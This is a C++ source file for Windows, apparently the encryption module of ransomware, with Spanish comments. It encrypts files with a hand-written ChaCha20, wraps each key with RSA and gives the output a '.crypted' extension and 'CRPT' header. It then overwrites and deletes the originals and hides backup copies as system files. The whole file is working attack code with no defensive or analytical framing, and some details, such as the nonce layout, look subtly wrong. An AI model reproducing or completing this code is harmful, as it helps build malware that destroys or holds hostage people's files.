#include "core/encryption.h"
#include <fstream>
#include <random>
#include <sstream>
#include <iomanip>

const std::string EncryptionEngine::ENCRYPTED_EXTENSION = ".crypted";

EncryptionEngine::EncryptionEngine() : hCryptProv(0), hKey(0), hPublicKey(0), hPrivateKey(0) {
}

EncryptionEngine::~EncryptionEngine() {
    if (hKey) CryptDestroyKey(hKey);
    if (hPublicKey) CryptDestroyKey(hPublicKey);
    if (hPrivateKey) CryptDestroyKey(hPrivateKey);
    if (hCryptProv) CryptReleaseContext(hCryptProv, 0);
}

bool EncryptionEngine::Initialize() {
    if (!InitializeCryptoProvider()) {
        return false;
    }
    
    if (!GenerateRSAKeyPair()) {
        return false;
    }
    
    return true;
}

bool EncryptionEngine::InitializeCryptoProvider() {
    if (!CryptAcquireContextA(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_SILENT)) {
        if (!CryptAcquireContextA(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET | CRYPT_SILENT)) {
            return false;
        }
    }
    return true;
}

bool EncryptionEngine::GenerateRSAKeyPair() {
    // Generar par de claves RSA-4096
    if (!CryptGenKey(hCryptProv, CALG_RSA_KEYX, CRYPT_EXPORTABLE, &hKey)) {
        return false;
    }
    
    // Exportar clave pública
    DWORD publicKeySize = 0;
    if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, NULL, &publicKeySize)) {
        return false;
    }
    
    std::vector<BYTE> publicKeyBuffer(publicKeySize);
    if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, publicKeyBuffer.data(), &publicKeySize)) {
        return false;
    }
    
    publicKeyData.assign(reinterpret_cast<char*>(publicKeyBuffer.data()), publicKeySize);
    
    // Exportar clave privada
    DWORD privateKeySize = 0;
    if (!CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, NULL, &privateKeySize)) {
        return false;
    }
    
    std::vector<BYTE> privateKeyBuffer(privateKeySize);
    if (!CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, privateKeyBuffer.data(), &privateKeySize)) {
        return false;
    }
    
    privateKeyData.assign(reinterpret_cast<char*>(privateKeyBuffer.data()), privateKeySize);
    
    return true;
}

std::string EncryptionEngine::GenerateKeyPair() {
    if (!GenerateRSAKeyPair()) {
        return "";
    }
    
    return publicKeyData;
}

bool EncryptionEngine::EncryptFile(const std::string& filePath, const std::string& publicKey) {
    // Crear backup antes de encriptar
    if (!BackupFile(filePath)) {
        return false;
    }
    
    // Leer contenido del archivo
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }
    
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    // Generar clave y nonce aleatorios para ChaCha20
    uint8_t key[CHACHA20_KEY_SIZE];
    uint8_t nonce[CHACHA20_NONCE_SIZE];
    
    if (!GenerateRandomBytes(key, CHACHA20_KEY_SIZE) || !GenerateRandomBytes(nonce, CHACHA20_NONCE_SIZE)) {
        return false;
    }
    
    // Encriptar contenido del archivo con ChaCha20
    std::vector<uint8_t> encryptedContent(content.size());
    if (!EncryptData(reinterpret_cast<const uint8_t*>(content.data()), content.size(), 
                    encryptedContent.data(), key, nonce)) {
        return false;
    }
    
    // Encriptar clave ChaCha20 con clave pública RSA
    std::string encryptedKey;
    {
        std::string keyStr(reinterpret_cast<char*>(key), CHACHA20_KEY_SIZE);
        encryptedKey = EncryptRSA(keyStr);
    }
    
    // Escribir archivo encriptado
    std::string encryptedFilePath = filePath + ENCRYPTED_EXTENSION;
    std::ofstream encryptedFile(encryptedFilePath, std::ios::binary);
    if (!encryptedFile.is_open()) {
        return false;
    }
    
    // Escribir header del archivo: [magic][nonce_size][nonce][encrypted_key_size][encrypted_key][encrypted_content]
    const char* magic = "CRPT";
    encryptedFile.write(magic, 4);
    
    uint32_t nonceSize = CHACHA20_NONCE_SIZE;
    encryptedFile.write(reinterpret_cast<const char*>(&nonceSize), 4);
    encryptedFile.write(reinterpret_cast<const char*>(nonce), nonceSize);
    
    uint32_t encryptedKeySize = encryptedKey.size();
    encryptedFile.write(reinterpret_cast<const char*>(&encryptedKeySize), 4);
    encryptedFile.write(encryptedKey.data(), encryptedKeySize);
    
    encryptedFile.write(reinterpret_cast<const char*>(encryptedContent.data()), encryptedContent.size());
    encryptedFile.close();
    
    // Eliminar de forma segura el archivo original
    SecureDeleteFile(filePath);
    
    return true;
}

bool EncryptionEngine::BackupFile(const std::string& filePath) {
    std::string backupPath = filePath + ".backup";
    
    std::ifstream src(filePath, std::ios::binary);
    std::ofstream dst(backupPath, std::ios::binary);
    
    if (!src.is_open() || !dst.is_open()) {
        return false;
    }
    
    dst << src.rdbuf();
    src.close();
    dst.close();
    
    // Ocultar archivo de backup
    SetFileAttributesA(backupPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    return true;
}

bool EncryptionEngine::SecureDeleteFile(const std::string& filePath) {
    // Sobrescribir archivo con datos aleatorios múltiples veces
    std::ofstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }
    
    // Obtener tamaño del archivo
    file.seekp(0, std::ios::end);
    size_t fileSize = file.tellp();
    file.seekp(0, std::ios::beg);
    
    // Sobrescribir con datos aleatorios 3 veces
    for (int pass = 0; pass < 3; pass++) {
        std::vector<uint8_t> randomData(fileSize);
        if (!GenerateRandomBytes(randomData.data(), fileSize)) {
            return false;
        }
        
        file.write(reinterpret_cast<const char*>(randomData.data()), fileSize);
        file.flush();
    }
    
    file.close();
    
    // Eliminar archivo
    return DeleteFileA(filePath.c_str()) != FALSE;
}

bool EncryptionEngine::EncryptData(const uint8_t* input, size_t inputSize, 
                                   uint8_t* output, const uint8_t* key, const uint8_t* nonce) {
    // Inicializar estado ChaCha20
    ChaCha20State state;
    
    // Configurar estado inicial
    // "expand 32-byte k" in little endian
    state.state[0] = 0x61707865;
    state.state[1] = 0x3320646e;
    state.state[2] = 0x79622d32;
    state.state[3] = 0x6b206574;
    
    // Copiar clave (8 words)
    for (int i = 0; i < 8; i++) {
        state.state[4 + i] = *reinterpret_cast<const uint32_t*>(key + i * 4);
    }
    
    // Copiar counter y nonce (3 words)
    state.state[12] = 0; // contador
    state.state[13] = 0;
    
    // Copiar nonce (3 words)
    for (int i = 0; i < 3; i++) {
        state.state[14 + i] = *reinterpret_cast<const uint32_t*>(nonce + i * 4);
    }
    
    state.position = 0;
    
    // Generar keystream y XOR con entrada
    uint8_t keystream[64];
    
    for (size_t i = 0; i < inputSize; i++) {
        if (state.position == 0) {
            ChaCha20Block(state.state);
            
            // Convertir estado a keystream
            for (int j = 0; j < 16; j++) {
                keystream[j * 4 + 0] = (state.state[j] >> 0) & 0xFF;
                keystream[j * 4 + 1] = (state.state[j] >> 8) & 0xFF;
                keystream[j * 4 + 2] = (state.state[j] >> 16) & 0xFF;
                keystream[j * 4 + 3] = (state.state[j] >> 24) & 0xFF;
            }
            
            // Incrementar contador
            state.state[12]++;
        }
        
        output[i] = input[i] ^ keystream[state.position];
        state.position = (state.position + 1) % 64;
    }
    
    return true;
}

void EncryptionEngine::ChaCha20Block(uint32_t state[16]) {
    uint32_t workingState[16];
    memcpy(workingState, state, sizeof(workingState));
    
    // 20 rondas (10 rondas dobles)
    for (int round = 0; round < 10; round++) {
        // Quarter round en columnas
        QuarterRound(workingState, 0, 4, 8, 12);
        QuarterRound(workingState, 1, 5, 9, 13);
        QuarterRound(workingState, 2, 6, 10, 14);
        QuarterRound(workingState, 3, 7, 11, 15);
        
        // Quarter round en diagonales
        QuarterRound(workingState, 0, 5, 10, 15);
        QuarterRound(workingState, 1, 6, 11, 12);
        QuarterRound(workingState, 2, 7, 8, 13);
        QuarterRound(workingState, 3, 4, 9, 14);
    }
    
    // Agregar estado original
    for (int i = 0; i < 16; i++) {
        state[i] += workingState[i];
    }
}

void EncryptionEngine::QuarterRound(uint32_t state[16], int a, int b, int c, int d) {
    state[a] += state[b]; state[d] ^= state[a]; state[d] = _rotl(state[d], 16);
    state[c] += state[d]; state[b] ^= state[c]; state[b] = _rotl(state[b], 12);
    state[a] += state[b]; state[d] ^= state[a]; state[d] = _rotl(state[d], 8);
    state[c] += state[d]; state[b] ^= state[c]; state[b] = _rotl(state[b], 7);
}

std::string EncryptionEngine::EncryptRSA(const std::string& data) {
    // Importar clave pública
    HCRYPTKEY hPublicKey = 0;
    if (!CryptImportKey(hCryptProv, reinterpret_cast<const BYTE*>(publicKeyData.data()), 
                        publicKeyData.size(), 0, 0, &hPublicKey)) {
        return "";
    }
    
    // Obtener tamaño de buffer requerido
    DWORD encryptedSize = 0;
    if (!CryptEncrypt(hPublicKey, 0, TRUE, 0, NULL, &encryptedSize, 0)) {
        CryptDestroyKey(hPublicKey);
        return "";
    }
    
    // Encriptar datos
    std::vector<BYTE> encryptedData(encryptedSize);
    DWORD dataSize = data.size();
    
    memcpy(encryptedData.data(), data.data(), dataSize);
    
    if (!CryptEncrypt(hPublicKey, 0, TRUE, 0, encryptedData.data(), &dataSize, encryptedSize)) {
        CryptDestroyKey(hPublicKey);
        return "";
    }
    
    CryptDestroyKey(hPublicKey);
    
    return std::string(reinterpret_cast<char*>(encryptedData.data()), encryptedSize);
}

bool EncryptionEngine::GenerateRandomBytes(uint8_t* buffer, size_t size) {
    return CryptGenRandom(hCryptProv, size, buffer) != FALSE;
}

std::string EncryptionEngine::GenerateRandomString(size_t length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string result;
    
    for (size_t i = 0; i < length; i++) {
        uint8_t randomByte;
        if (GenerateRandomBytes(&randomByte, 1)) {
            result += charset[randomByte % (sizeof(charset) - 1)];
        }
    }
    
    return result;
}

bool EncryptionEngine::SaveProtectedPrivateKey() {
    if (privateKeyData.empty()) return false;

    std::vector<BYTE> blob(
        reinterpret_cast<const BYTE*>(privateKeyData.data()),
        reinterpret_cast<const BYTE*>(privateKeyData.data()) + privateKeyData.size()
    );

    return KeyPersistence::SavePrivateKey(blob);
}

bool EncryptionEngine::LoadProtectedPrivateKey() {
    std::vector<BYTE> blob;
    if (!KeyPersistence::LoadPrivateKey(blob)) return false;

    // Restaurar datos de clave privada raw
    privateKeyData.assign(reinterpret_cast<const char*>(blob.data()), blob.size());
    SecureZeroMemory(blob.data(), blob.size());

    // Re-importar la clave al CSP para que DecryptRSA / DecryptFile funcionen
    if (hPrivateKey) {
        CryptDestroyKey(hPrivateKey);
        hPrivateKey = 0;
    }

    if (!CryptImportKey(hCryptProv,
                        reinterpret_cast<const BYTE*>(privateKeyData.data()),
                        static_cast<DWORD>(privateKeyData.size()),
                        0, 0, &hPrivateKey)) {
        return false;
    }

    return true;
}
